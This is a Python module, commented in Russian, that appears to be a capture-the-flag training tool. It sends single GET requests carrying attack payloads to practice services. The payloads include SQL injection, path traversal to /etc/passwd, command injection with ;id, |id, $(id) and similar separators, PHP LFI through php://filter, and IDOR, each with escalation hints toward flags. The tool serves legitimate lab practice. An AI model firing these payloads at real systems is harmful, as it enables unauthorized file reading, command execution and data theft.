"""Тренажёр: восемь эксплойтов, которые надо уметь делать руками.

Каждый пункт — это не текст «почитай про SQLi», а пара «запрос + маркер»:
инструмент отправляет один GET и говорит, сработало или нет. Так перед игрой
проверяется не память, а руки.

Почему одни и те же классы: на X Кубке они дают большинство флагов, а
подготовка к ним занимает вечер, а не неделю.

Все запросы идут через тот же бюджет и журнал, что и пробы: GET, пауза, лимит,
`/_checker` заблокирован до отправки.
"""
from __future__ import annotations

import re
import time

from . import probe
from .ratelimit import BUDGET

MAX_BODY = probe.MAX_BODY


class DrillError(RuntimeError):
    """Дrill не может быть выполнен: нет цели или кончился бюджет."""


DRILLS: list[dict] = [
    {
        "id": "sqli-quote",
        "title": "SQLi: кавычка ломает запрос",
        "class": "SQL injection",
        "service": "notes",
        "port": 8081,
        "path": "/api/search?q='",
        "expect": r"SQLITE_ERROR|SQL syntax|unclosed quotation|syntax error",
        "expect_status": "5xx",
        "why": "Значение попадает в текст SQL. Одинарная кавычка закрывает литерал, и база отвечает ошибкой.",
        "next": "Дальше: ' OR '1'='1 — если строк стало больше, данных хватает и на UNION.",
        "variants": ["'", "' OR '1'='1", "' UNION SELECT 1--"],
        "fix": "sql-fstring",
    },
    {
        "id": "sqli-union",
        "title": "SQLi: UNION вытаскивает данные",
        "class": "SQL injection",
        "service": "notes",
        "port": 8081,
        "path": "/api/search?q=%25'%20UNION%20SELECT%201,2--",
        "expect": r"SQLITE_ERROR|SQL syntax|unclosed|count|items",
        "expect_status": "5xx",
        "why": "После подтверждения инъекции UNION добавляет свою выборку: число колонок подбирается по ошибке.",
        "next": "Сначала считают колонки (ORDER BY n), потом подставляют чтение таблицы флагов.",
        "variants": ["' ORDER BY 1--", "' ORDER BY 9--"],
        "fix": "sql-fstring",
    },
    {
        "id": "traversal",
        "title": "Обход пути: читаем /etc/passwd",
        "class": "Path traversal",
        "service": "notes",
        "port": 8081,
        "path": "/files?name=../../../../etc/passwd",
        "expect": r"root:x:0:0",
        "why": "Путь склеивается из параметра без проверки границ. Достаточно выйти на уровень выше корня.",
        "next": "На игре цель — файл флага, а не passwd. Смотрите, куда чекер кладёт флаг.",
        "variants": ["../../../../etc/passwd", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
        "fix": "path-join",
    },
    {
        "id": "cmd-injection",
        "title": "Инъекция команд: ;id",
        "class": "Command injection",
        "service": "notes",
        "port": 8081,
        "path": "/ping?host=127.0.0.1;id",
        "expect": r"uid=\d+",
        "why": "Строка уходит в оболочку целиком: точка с запятой разделяет команды.",
        "next": "Так же работает `|id`, `$(id)`, `%0aid` — если фильтр режет один разделитель, ищите другой.",
        "variants": [";id", "|id", "$(id)", "%0Aid"],
        "fix": "cmd-shell",
    },
    {
        "id": "lfi",
        "title": "LFI в PHP: include с параметром",
        "class": "Local file inclusion",
        "service": "warehouse",
        "port": 8083,
        "path": "/view?page=../../../../etc/passwd",
        "expect": r"root:x:0:0",
        "why": "include() берёт путь из запроса. php://filter даёт чтение исходников без выполнения.",
        "next": "Читайте исходник сервиса через php://filter/convert.base64-encode/resource=index.php.",
        "variants": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
        "fix": "php-include",
    },
    {
        "id": "sqli-node",
        "title": "SQLi в Node: шаблонная строка",
        "class": "SQL injection",
        "service": "archive",
        "port": 8082,
        "path": "/api/search?q='",
        "expect": r"SQLITE_ERROR|SQL syntax|500",
        "expect_status": "5xx",
        "why": "Тот же класс в другом стеке: db.query(`… LIKE '%${q}%'`). Вывод тот же — ошибка синтаксиса.",
        "next": "В Node ошибка часто уходит в 500 с текстом драйвера: это и есть доказательство.",
        "variants": ["'", "' OR 1=1--"],
        "fix": "js-sql-template",
    },
    {
        "id": "cmd-node",
        "title": "Инъекция команд в Node: tar и ;id",
        "class": "Command injection",
        "service": "archive",
        "port": 8082,
        "path": "/api/export?name=;id",
        "expect": r"uid=\d+",
        "why": "exec() склеивает строку команды: аргумент с точкой с запятой выполняет вторую команду.",
        "next": "В таких ручках часто есть чтение архива: ищите ручку, которая отдаёт файл по имени.",
        "variants": [";id", "|id", "`id`"],
        "fix": "js-exec-request",
    },
    {
        "id": "idor",
        "title": "IDOR: чужой объект по id",
        "class": "IDOR / BOLA",
        "service": "notes",
        "port": 8081,
        "path": "/api/note?id=1",
        "expect": r"title|body",
        "why": "Объект достаётся по id без проверки владельца. Проверка — сравнить ответ для своего и чужого id.",
        "next": "На игре id флага обычно лежит рядом: перебор вручную 1..20, без автоматики.",
        "variants": ["/api/note?id=1", "/api/note?id=2"],
        "fix": "idor-id-only",
    },
]


def catalog() -> list[dict]:
    """Список без служебных полей: то, что показывает интерфейс."""
    fields = ("id", "title", "class", "service", "port", "path", "why", "next", "variants", "fix")
    return [{key: entry.get(key) for key in fields} for entry in DRILLS]


def by_id(drill_id: str) -> dict:
    for entry in DRILLS:
        if entry["id"] == drill_id:
            return entry
    raise DrillError(f"упражнение не найдено: {drill_id}")


def run(drill_id: str, base: str) -> dict:
    """Один GET и проверка маркера. Тратит один токен бюджета."""
    entry = by_id(drill_id)
    base = (base or "").rstrip("/")
    if not base.startswith(("http://", "https://")):
        raise DrillError("нужен базовый URL вида http://host:port")
    url = base + entry["path"]

    allowed, retry_after = BUDGET.take(1)
    if not allowed:
        raise DrillError(f"бюджет исчерпан, повтор через {retry_after:.0f} с")

    opener = probe._opener()  # noqa: SLF001 - один движок, один журнал, один бюджет
    started = time.time()
    answer = probe._fetch(opener, url, label="drill")  # noqa: SLF001
    status = int(answer.get("status") or 0)
    body = answer.get("body") or b""
    text = body.decode("utf-8", "replace")
    match = re.search(entry["expect"], text, re.I)
    hit = bool(match)
    reason = ""
    if hit:
        reason = match.group(0)[:40]
    elif entry.get("expect_status") == "5xx" and 500 <= status < 600:
        # серверная ошибка на полезной нагрузке — тоже доказательство:
        # запрос дошёл до стока и сломал его
        hit = True
        reason = f"HTTP {status} на нагрузке"

    snippet = ""
    if match:
        start = max(0, match.start() - 40)
        snippet = text[start:match.end() + 60].replace("\n", " ").strip()
    elif hit:
        snippet = text.strip().replace("\n", " ")[:120]

    flag_match = probe.FLAG_RE.search(text)
    flag = flag_match.group(0)[:120] if flag_match else None

    return {
        "id": entry["id"],
        "title": entry["title"],
        "class": entry["class"],
        "url": url,
        "status": status,
        "ms": answer.get("ms"),
        "bytes": len(body),
        "hit": hit,
        "flag": flag,
        "reason": reason,
        "marker": entry["expect"],
        "evidence": snippet,
        "error": answer.get("error"),
        "why": entry["why"],
        "next": entry["next"],
        "variants": entry["variants"],
        "fix": entry["fix"],
        "took_ms": int((time.time() - started) * 1000),
    }


def bases(target: dict, default_port: int = 8081) -> dict[str, str]:
    """Базовые URL по имени сервиса из конфигурации цели."""
    host = (target.get("host") or "").strip() or "127.0.0.1"
    return {entry["service"]: f"http://{host}:{entry['port']}" for entry in DRILLS}
